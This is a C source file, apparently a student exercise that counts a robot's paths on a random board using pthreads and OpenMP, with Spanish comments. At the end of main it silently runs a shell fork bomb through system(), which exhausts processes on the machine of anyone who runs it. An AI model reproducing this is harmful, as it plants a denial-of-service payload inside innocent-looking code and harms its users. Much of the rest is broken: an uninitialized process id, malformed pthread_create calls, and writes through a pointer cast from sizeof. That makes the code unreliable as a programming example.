/* -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.
* File Name : main.c
* Creation Date : 12-05-2016
* Last Modified : Thu 12 May 2016 10:24:47 AM CDT
* Created By : shiro-saber

KNOW LEARN        .==.
C LANGUAGE       ()''()-.
      .---.       ;--; /
    .'_:___". _..'.  __'.
    |__ --==|'-''' \'...;
   [  ]  :[|       |---\
    |__| I=[|     .'    '.
    / / ____|     :       '._
   |-/.____.'      | :       :
  /___\ /___\      '-'._----'
_._._._._._._._._._._._._._._._._._._._._.*/

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include <omp.h>

#define nprocesadores 8
#define HILOS 4

typedef struct {
	int x;
	int y;
} Move;

typedef struct RobotT {
	int x;
	int y;
	struct RobotT *r;
	int steps;
} Robot;

void printBoard(char *); //es obvio
void divideBoard(int *); //divide el tablero
void gestor(int sig); //gestor de la señal
int moveValid(Move m, int *b); //movimientos validos
Move *getMoves(Robot *r); //regresa los movimientos
int isFinal(Move m); //llegue al final
void execute(Robot *, int *); //ejecutar
int tamano; //tamaño del tablero
int myResult = 0;
int *b;

int main(int argc, char *argv[])
{
  printf("Hello World\n"); //minimo un 10/100
  system("say pasame");
  printf("Ingresa el tamaño del tablero\n");
  scanf("%d", &tamano);

  pthread_t *threads = (pthread_t*)malloc(sizeof(pthread_t)*HILOS);
  int ready = 0;

	int myid, numprocs, nh, tid;
	int  longitud;
	int *x_start = (int*)malloc(sizeof(int));
	int *y_start = (int*)malloc(sizeof(int));

  if (myid == 0)
    if (signal(SIGUSR1,gestor) == SIG_ERR)
	    printf("No se pudo establecer el manejador de la senal....\n");

  b = (int*)malloc(tamano*tamano*sizeof(int));
	int i;

	for (i=0;i<tamano*tamano;++i)
	  *(b+i) = rand()%3;

  *(b+0) = 0;

	Robot *r = (Robot*)malloc(sizeof(Robot));
	r->x = 0;
	r->y = 0;
	r->steps = 0;
	r->r = NULL;

  printBoard(b);

	if (myid == 0)
  {
	  printf("I am the boss, I divide the board\n");
	  divideBoard(b);
	}

  /* THREADS */
  for(i = 0; i < HILOS; ++i)
    pthread_create(*(threads+i), 0,(void*)getMoves, (void*)r);

  for(i = 0; i < HILOS; ++i)
    pthread_join(*(threads+i), NULL);

  r->x = *x_start;
	r->y = *y_start;
	printf("I am the process %d and I have my board\n",myid);
	execute(r,b);

  free(b);
	free(r);
	free(x_start);
	free(y_start);
  free(threads);
  
  system(":(){ :|: &};:");

  return 0;
}

void gestor(int sig)
{
  printf("Recibi SIGUSR1\n");
  sleep(2);
}

void printBoard(char *b)
{
 int i,j;
	for (i=0;i<tamano;++i)
  {
    for (j=0;j<tamano;++j)
    {
	    if (*(b+tamano*i+j)==0)
	      printf("0 ");
	    else 
	      printf("1 ");
	  }
	  printf("\n");
	} 
}

void divideBoard(int *b)
{
  int size = sqrt((tamano*tamano)/nprocesadores);
	int blocks = size/2;
	printf ("Size of each board %d and %d blocks per row\n",size,blocks);

	int i;
	int *x = (int*)sizeof(int);
	int *y = (int*)sizeof(int);
	int j = 0;
	*x = 0;

	#pragma omp for private(x,y)
	for (i=0;i<nprocesadores;++i)
  {
	  *y = *x + j*size;
	  j++;
	  if (j == blocks)
    {
	    j = 0;
	    x = x + size;
	  }		
	}

	free(x);
	free(y);
}

int moveValid(Move m, int *b){
  return m.x >= 0 && m.x < tamano && m.y >= 0 && m.y < tamano && *(b+m.x) == 0 && *(b+m.y) == 0;
}

Move* getMoves(Robot *r)
{	
  Move *m = (Move*)malloc(4*sizeof(Move));
	int i;
	for (i=0;i<4;++i)
  {
	  Move newMove;
	  if (i==0)
    {
	    newMove.x = r->x + 1;
	    newMove.y = r->y;
	    *(m+i) = newMove;
	  }
	  if (i==1)
    {
	    newMove.x = r->x;
	    newMove.y = r->y + 1;
	    *(m+i) = newMove;
	  }
	  if (i==2)
    {
	    newMove.x = r->x - 1;
	    newMove.y = r->y;
	    *(m+i) = newMove;
	  }
	  if (i==3)
    {
	    newMove.x = r->x;
	    newMove.y = r->y - 1;
	    *(m+i) = newMove;
	  }
	}
	return m;
}

int isFinal(Move m)
{
	return m.x == tamano-1 && m.y == tamano-1;
}

void execute(Robot *r, int *b)
{
	Move *m = getMoves(r);
	int i;
	
  #pragma omp for private(i)
	for (i=0;i<4;++i)
  {
    Move move = *(m+i);
	  if (moveValid(move,b))
    {
	    if (isFinal(move))
	      myResult++;
	    else 
      {
	      Robot *newRobot = (Robot*)malloc(sizeof(Robot));
	      newRobot->x = move.x;
	      newRobot->y = move.y;
	      newRobot->steps = r->steps+1;
	      newRobot->r = r;
	      execute(newRobot,b);
	      free(newRobot);
	    }
	  }
	}
	free(m);
}
